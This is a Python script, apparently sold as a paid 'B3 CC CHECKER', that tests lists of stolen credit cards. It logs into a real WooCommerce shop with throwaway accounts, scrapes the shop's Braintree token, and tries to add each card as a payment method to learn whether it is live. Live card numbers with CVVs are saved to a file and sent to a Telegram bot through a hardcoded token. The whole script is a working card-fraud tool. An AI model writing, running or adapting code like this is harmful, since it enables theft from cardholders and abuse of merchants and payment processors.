import requests,time,user_agent,re,base64,random,re,base64,os,sys
from user_agent import *
from colorama import Fore
#---------[COLORS]--------#
Z =  '\033[91m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
OKBLUE = '\033[94m'
WARNING = '\033[93m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
LIME = '\033[38;5;10m'
W=Fore.WHITE
L=Fore.BLUE
#-------[CLEAR]--------#
def clear():
    os.system('clear')
#----------LOGO-------------#
logo = ("""
\033[38;2;173;216;230m ########  ########     ###     ######    #######  ##    ## 
\033[38;2;255;160;122m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
\033[38;2;144;238;144m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
\033[38;2;255;69;0m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
\033[38;2;30;144;255m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
\033[38;2;238;130;238m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
\033[38;2;255;215;0m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
\x1b[1;95m┏───────────────────────────────────────────────┓
\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204mNIGHT STALKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mPAID🔥
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219mNIGHT-STALKER-666
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;206;209mB3 CC CHECKER
\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;255;105;180m2.1
\x1b[1;91m \x1b[1;46m\033[1;91m ✅ NOT JUST A BRAINTREE CHECKER\033[;0m\033[1;91m\033[1;92m
\x1b[1;95m┗───────────────────────────────────────────────┛
""")
def linex():
        print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
def clear():
        os.system(f'clear')
        print(logo)
#--------[FLAGS]-----------#
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
channel_id = "-1002317552901"
country_flags = {
    "Afghanistan": "🇦🇫", "Albania": "🇦🇱", "Algeria": "🇩🇿", "Andorra": "🇦🇩", "Angola": "🇦🇴", "Antigua and Barbuda": "🇦🇬", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺", "Austria": "🇦🇹", "Azerbaijan": "🇦🇿",
    "Bahamas": "🇧🇸", "Bahrain": "🇧🇭", "Bangladesh": "🇧🇩", "Barbados": "🇧🇧", "Belarus": "🇧🇾", "Belgium": "🇧🇪", "Belize": "🇧🇿", "Benin": "🇧🇯", "Bhutan": "🇧🇹", "Bolivia": "🇧🇴", "Bosnia and Herzegovina": "🇧🇦", "Botswana": "🇧🇼",
    "Brazil": "🇧🇷", "Brunei": "🇧🇳", "Bulgaria": "🇧🇬", "Burkina Faso": "🇧🇫", "Burundi": "🇧🇮", "Cabo Verde": "🇨🇻", "Cambodia": "🇰🇭", "Cameroon": "🇨🇲", "Canada": "🇨🇦", "Central African Republic": "🇨🇫", "Chad": "🇹🇩",
    "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴", "Comoros": "🇰🇲", "Congo": "🇨🇬", "Congo (Democratic Republic)": "🇨🇩", "Costa Rica": "🇨🇷", "Croatia": "🇭🇷", "Cuba": "🇨🇺", "Cyprus": "🇨🇾", "Czech Republic": "🇨🇿",
    "Denmark": "🇩🇰", "Djibouti": "🇩🇯", "Dominica": "🇩🇲", "Dominican Republic": "🇩🇴", "Ecuador": "🇪🇨", "Egypt": "🇪🇬", "El Salvador": "🇸🇻", "Equatorial Guinea": "🇲🇱", "Eritrea": "🇪🇷", "Estonia": "🇪🇪", "Eswatini": "🇸🇿",
    "Ethiopia": "🇪🇹", "Fiji": "🇫🇯", "Finland": "🇫🇮", "France": "🇫🇷", "Gabon": "🇬🇦", "Gambia": "🇲🇲", "Georgia": "🇬🇪", "Germany": "🇩🇪", "Ghana": "🇬🇭", "Greece": "🇬🇷", "Grenada": "🇬🇩", "Guatemala": "🇵🇪",
    "Guinea": "🇬🇳", "Guinea-Bissau": "🇬🇼", "Guyana": "🇬🇾", "Haiti": "🇭🇹", "Honduras": "🇭🇳", "Hungary": "🇭🇺", "Iceland": "🇮🇸", "India": "🇮🇳", "Indonesia": "🇮🇩", "Iran": "🇮🇷", "Iraq": "🇮🇶", "Ireland": "🇮🇪",
    "Israel": "🇮🇱", "Italy": "🇮🇹", "Jamaica": "🇯🇲", "Japan": "🇯🇵", "Jordan": "🇯🇴", "Kazakhstan": "🇰🇿", "Kenya": "🇰🇪", "Kiribati": "🇰🇮", "Korea (North)": "🇰🇵", "Korea (South)": "🇰🇷", "Kuwait": "🇰🇼", "Kyrgyzstan": "🇰🇬",
    "Laos": "🇱🇦", "Latvia": "🇱🇻", "Lebanon": "🇱🇧", "Lesotho": "🇱🇸", "Liberia": "🇱🇸", "Libya": "🇱🇾", "Liechtenstein": "🇱🇮", "Lithuania": "🇱🇹", "Luxembourg": "🇱🇺", "Madagascar": "🇲🇬", "Malawi": "🇲🇼", "Malaysia": "🇲🇾",
    "Maldives": "🇲🇻", "Mali": "🇲🇱", "Malta": "🇲🇹", "Marshall Islands": "🇲🇭", "Mauritania": "🇲🇷", "Mauritius": "🇲🇺", "Mexico": "🇲🇽", "Micronesia": "🇫🇲", "Moldova": "🇲🇩", "Monaco": "🇲🇨", "Mongolia": "🇲🇳", "Montenegro": "🇲🇪",
    "Morocco": "🇲🇦", "Mozambique": "🇲🇿", "Myanmar": "🇲🇲", "Namibia": "🇳🇦", "Nauru": "🇳🇷", "Nepal": "🇳🇵", "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nicaragua": "🇳🇮", "Niger": "🇳🇪", "Nigeria": "🇳🇬", "North Macedonia": "🇲🇰",
    "Norway": "🇳🇴", "Oman": "🇴🇲", "Pakistan": "🇵🇰", "Palau": "🇵🇼", "Palestine": "🇵🇸", "Panama": "🇵🇦", "Papua New Guinea": "🇵🇬", "Paraguay": "🇵🇾", "Peru": "🇵🇪", "Philippines": "🇵🇭", "Poland": "🇵🇱", "Portugal": "🇵🇹",
    "Qatar": "🇶🇦", "Romania": "🇷🇴", "Russia": "🇷🇺", "Rwanda": "🇷🇼", "Saint Kitts and Nevis": "🇰🇳", "Saint Lucia": "🇱🇨", "Saint Vincent and the Grenadines": "🇻🇨", "Samoa": "🇼🇸", "San Marino": "🇸🇲", "Sao Tome and Principe": "🇸🇹",
    "Saudi Arabia": "🇸🇦", "Senegal": "🇸🇳", "Serbia": "🇷🇸", "Seychelles": "🇸🇨", "Sierra Leone": "🇸🇱", "Singapore": "🇸🇬", "Slovakia": "🇸🇰", "Slovenia": "🇸🇮", "Solomon Islands": "🇸🇧", "Somalia": "🇲🇲", "South Africa": "🇿🇦",
    "South Sudan": "🇸🇸", "Spain": "🇪🇸", "Sri Lanka": "🇱🇰", "Sudan": "🇸🇩", "Suriname": "🇸🇷", "Sweden": "🇸🇪", "Switzerland": "🇨🇭", "Syria": "🇸🇾", "Taiwan": "🇹🇼", "Tajikistan": "🇹🇯", "Tanzania": "🇹🇿", "Thailand": "🇹🇭",
    "Timor-Leste": "🇹🇱", "Togo": "🇹🇬", "Tonga": "🇹🇴", "Trinidad and Tobago": "🇹🇹", "Tunisia": "🇹🇳", "Turkey": "🇹🇷", "Turkmenistan": "🇹🇲", "Tuvalu": "🇹🇻", "Uganda": "🇺🇬", "Ukraine": "🇺🇦", "United Arab Emirates": "🇦🇪",
    "United Kingdom": "🇬🇧", "United States of America": "🇺🇸", "Uruguay": "🇺🇾", "Uzbekistan": "🇺🇿", "Vanuatu": "🇻🇺", "Vatican City": "🇻🇦", "Venezuela": "🇻🇪", "Vietnam": "🇻🇳", "Yemen": "🇾🇪", "Zambia": "🇿🇲", "Zimbabwe": "🇿🇼"
}
#--------[BIN-CHECK]-------#
def get_country_flag(country_name):
    return country_flags.get(country_name, '')

def bin_lookup(bin_code):
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        
        bank_name = data.get('bank', 'N/A')
        country_name = data.get('country_name', 'N/A')
        country_flag = data.get('country_flag', '')
        scheme = data.get('brand', 'N/A')
        card_type = data.get('type', 'N/A')
        level = data.get('level', 'N/A')
        country_currencies = data.get('country_currencies', 'N/A')

        scheme = scheme if scheme else "N/A"
        card_type = card_type if card_type else "N/A"
        level = level if level else "N/A"
        bank_name = bank_name if bank_name else "N/A"
        country_name = country_name if country_name else "N/A"
        
        result = (
            f"*🔹 𝗜𝗡𝗙𝗢:* `{scheme.upper()} - {card_type.upper()} - {level.upper()}`\n"
            f"*🔹 𝗜𝗦𝗦𝗨𝗘𝗥:* _{bank_name.upper()}_\n"
            f"*🔹 𝗖𝗢𝗨𝗡𝗧𝗥𝗬:* `{country_name.upper()}` {country_flag}\n"
            f"*🔹 𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗜𝗘𝗦:* `{country_currencies}`"
        )
        return result
    else:
        return "*[✘] BIN lookup failed.*"
#-------[SAVE CARDS]----#
def save_valid_card(ccx):
    with open("valid_cards.txt", "a") as file:
        file.write(f"{ccx}\n")
#-------[USERNAME FETCH]
bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
def get_telegram_username(user_id, bot_token):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={user_id}"
        response = requests.get(url)
        data = response.json()
        
        if response.status_code == 200 and "result" in data:
            username = data["result"].get("username", None)
            if username:
                return f"@{username}"
            else:
                return "This user does not have a username."
        else:
            return f"Failed to fetch username. Error: {data.get('description', 'Unknown error')}"
    except Exception as e:
        return f"An error occurred: {str(e)}"
#-------[ANIMATION]-----#
def typewriter(text, speed=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()
message = f"{LIME}{BOLD}GO TO {WARNING}{UNDERLINE}B3 DROPPER BOT{ENDC} {LIME}AND CLICK ON START. ELSE WAIT,{ENDC} {WARNING}{BOLD}CODE WILL REDIRECT YOU 🤝{ENDC}"

#-------[CHECKER]-------#
clear_terminal()
print(logo)
typewriter(message, speed=0.08)
time.sleep(10)
os.system(f'xdg-open https://t.me/b3ccdrop_bot')
clear_terminal()
print(logo)
user_id = input("Please enter your Telegram user ID: ")
combo=input(X+'CC FILE PATH :'+X)
y=open(f'{combo}',"+r")
start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
    start_num += 1
    ccx = y.strip().split('\n')[0]
    c = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    bin_code = c[:6]
    if "20" in yy:
        yy = yy.split("20")[1]
    acc = ['dragonfight001@gmail.com', 'dragonfight002@gmail.com', 'dragonfight003@gmail.com', 'dragonfight004@gmail.com', 'dragonfight005@gmail.com', 'dragonfight006@gmail.com', 'bincryrid@hamham.uk', 'dipflypar@kksm.be', 'duecapas545@choco.la', 'rag481@kmail.li', 'jotdrpry@mirai.re', 'dinmapis@instmail.uk', 'maddubits@sendapp.uk', 'dragontech177@gmail.com', 'himhas407@send4.uk', 'nadiya001@exdonuts.com', 'zipmobsir750@exdonuts.com', 'figlaxno@exdonuts.com', 'cryournet@kksm.be', 'dewask760@send4.uk']
    email = random.choice(acc)
    print(F) 
    user = user_agent.generate_user_agent()
    r = requests.session()
    headers = {'user-agent': user}
    response = r.post(
        'https://www.studynotesaba.com/my-account/add-payment-method/', headers=headers)
    nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
    data = {
    'username': email,
    'password': 'ZmwXn8zkU2kK!LP',
    'wpa_initiator': '',
    'alt_s': '',
    'udwsno9687': '828176',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
}
    
    response = r.post(
        'https://www.studynotesaba.com/my-account/add-payment-method/',
        cookies=r.cookies,
        headers=headers,
        data=data,
    )
    nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
    enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
    dec = base64.b64decode(enc).decode('utf-8')
    au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '882ba276-e1af-492b-8fca-0dfeba316685',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '48417',
                    'streetAddress': '12633 Dorwood Road',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']
    import requests
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.studynotesaba.com',
        'priority': 'u=0, i',
        'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user}
    
    data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"c8aaedd0ae3a4ae4b4989e0dceb957d7","fraud_merchant_id":null,"correlation_id":"882ba276-e1af-492b-8fca-0dfeba31"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU2NjY4MDMsImp0aSI6ImM2NGI0MzY2LWI0MTItNDEzOS04OWQ5LWMxNDI4NTc4NjAzNyIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.WBRfMeJOmLOBiNHMMOABRV4EBzSEYTRJOMWfmapQ_QQV2stf1wfIui0qQtdlLAeweMKMzwfwyzdLIQJzJFLqXQ","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
    
    response = r.post(
        'https://www.studynotesaba.com/my-account/add-payment-method/',
        cookies=r.cookies,
        headers=headers,
        data=data,
    )
    text = response.text
    pattern = r'Reason: (.+?)\s*</li>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        print(f"\033[1;31m[\033[1;33m{start_num}\033[1;31m] \033[1;37m{ccx} \033[0;31m>> \033[1;31m{result} ❌\033[0m") 
    else:
        if 'Payment method successfully added.' in text:
            result = "1000: Approved"
        elif 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
        elif 'Do Not Honor' in text:
            result = "DEAD: Do Not Honor"
        elif 'Please wait for 20 seconds.' in text:
            time.sleep(5)
            result = "try again"
        else:
            result = "Error"
    if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
        print(f"\033[1;32m[\033[1;33m{start_num}\033[1;32m] \033[1;37m{ccx} \033[0;32m>> \033[1;32m{result} ✅\033[0m")
        save_valid_card(ccx)
        username = get_telegram_username(user_id, bot_token)
        bin_result = bin_lookup(bin_code)
        message = f"""
✥ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐁₃ 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐕2.1 ✥
★━━━━━━✧★✰★✧━━━━━━★
🔹 𝗖𝗮𝗿𝗱- {ccx}
🔹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆- Braintree [$0.01]
🔹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲- ⤿ {result} ⤾
★━━━━━━[𝐁𝐈𝐍 𝐈𝐍𝐅𝐎]━━━━━━★
{bin_result}
★━━━━━━✧★✰★✧━━━━━━★
✨ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲- [★ Night Stalker 🐾🐐](tg://user?id=1344144034)
✨ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲- {username}
"""
        requests.post(f"https://api.telegram.org/bot7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg/sendMessage", data={'chat_id': user_id, 'text': message, 'parse_mode': 'Markdown'})
else:
    print(f'[{start_num}] {ccx} >> {result}❌')
    time.sleep(100)
    
